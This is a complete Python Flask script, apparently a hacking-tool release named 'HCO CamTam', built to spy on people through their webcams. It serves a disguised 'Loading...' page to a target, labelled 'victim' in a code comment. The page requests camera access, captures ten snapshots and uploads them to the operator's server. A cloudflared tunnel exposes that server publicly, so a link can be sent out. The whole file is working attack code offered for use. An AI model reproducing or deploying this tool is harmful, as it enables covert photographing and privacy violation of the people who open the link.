#!/usr/bin/env python3
from flask import Flask, request, render_template_string
import os, threading, time, webbrowser

app = Flask(__name__)
image_count = 0
TOTAL_IMAGES = 10

# HTML template served to victim
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
<title>Camera Capture</title>
</head>
<body>
<h3>Loading...</h3>
<script>
let count = 0;
function captureImage() {
    if(count >= {{ total }}) return;
    navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        const canvas = document.createElement('canvas');
        canvas.width = 320;
        canvas.height = 240;

        setTimeout(() => {
            canvas.getContext('2d').drawImage(video,0,0,320,240);
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('image', blob, 'img'+count+'.png');
                fetch('/upload', {method:'POST', body: formData});
                count++;
                captureImage();
            }, 'image/png');
        }, 1000);
    });
}
captureImage();
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE, total=TOTAL_IMAGES)

@app.route('/upload', methods=['POST'])
def upload():
    global image_count
    image = request.files['image']
    image.save(f"images/img_{image_count+1}.png")
    image_count += 1
    print(f"\033[1;32mImage Received ✅ ({image_count}/{TOTAL_IMAGES})\033[0m")
    if image_count == TOTAL_IMAGES:
        print("\033[1;33mAll 10 Images Received 🎉\033[0m")
    return "OK"

def start_cloudflare():
    os.system("cloudflared tunnel --url http://127.0.0.1:5000 &")

if __name__ == '__main__':
    os.makedirs("images", exist_ok=True)

    print("\033[1;31mHCO CamTam by Azhar\033[0m")
    print("\033[1;34mRedirecting to YouTube in 5 seconds...\033[0m")
    time.sleep(5)
    webbrowser.open("https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    
    print("\033[1;32mStarting server...\033[0m")
    threading.Thread(target=start_cloudflare).start()
    app.run(host="0.0.0.0", port=5000)
